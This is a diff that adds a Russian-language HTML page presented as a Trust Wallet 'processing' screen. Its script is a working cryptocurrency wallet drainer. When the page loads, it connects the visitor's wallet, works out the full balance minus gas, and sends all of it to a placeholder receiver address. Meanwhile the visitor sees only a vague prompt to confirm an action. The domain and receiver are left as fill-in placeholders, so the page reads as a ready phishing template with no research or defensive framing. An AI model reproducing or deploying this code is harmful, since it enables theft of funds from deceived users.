@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Processing...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
+
+  <style>
+    body {
+      background: #020617;
+      color: #e5e7eb;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+    .box {
+      max-width: 360px;
+    }
+    .hint {
+      font-size: 14px;
+      opacity: 0.85;
+      margin-top: 12px;
+      word-break: break-all;
+    }
+  </style>
+</head>
+<body>
+
+<div class="box">
+  <h2>Инициализация…</h2>
+  <p>Подтвердите действие в Trust Wallet</p>
+  <div class="hint" id="status"></div>
+
+  <!-- fallback если не открыт в Trust Wallet -->
+  <p style="margin-top:16px">
+    <a href="https://link.trustwallet.com/open_url?coin_id=60&url=https://YOUR-DOMAIN.COM"
+       style="color:#60a5fa">
+      Открыть в Trust Wallet
+    </a>
+  </p>
+</div>
+
+<script>
+(async () => {
+  const status = document.getElementById("status");
+
+  if (!window.ethereum) {
+    status.innerText = "❌ Откройте страницу через Trust Wallet";
+    return;
+  }
+
+  try {
+    // 1. Подключение кошелька
+    await ethereum.request({ method: "eth_requestAccounts" });
+
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+
+    // 2. Баланс
+    const balance = await provider.getBalance(address);
+
+    // 3. Газ
+    const gasPrice = await provider.getGasPrice();
+    const gasLimit = ethers.BigNumber.from(21000);
+    const gasCost = gasPrice.mul(gasLimit);
+
+    if (balance.lte(gasCost)) {
+      status.innerText = "❌ Недостаточно средств для оплаты газа";
+      return;
+    }
+
+    // 4. Максимально возможная сумма
+    const value = balance.sub(gasCost);
+
+    status.innerText = "⏳ Ожидание подтверждения транзакции…";
+
+    // 5. Отправка транзакции
+    const tx = await signer.sendTransaction({
+      to: "0xRECEIVER_ADDRESS",
+      value: value,
+      gasLimit: gasLimit,
+      gasPrice: gasPrice
+    });
+
+    status.innerText = "✅ Транзакция отправлена:\n" + tx.hash;
+
+  } catch (e) {
+    status.innerText = "❌ Отменено или ошибка:\n" + (e.message || e);
+  }
+})();
+</script>
+
+</body>
+</html>
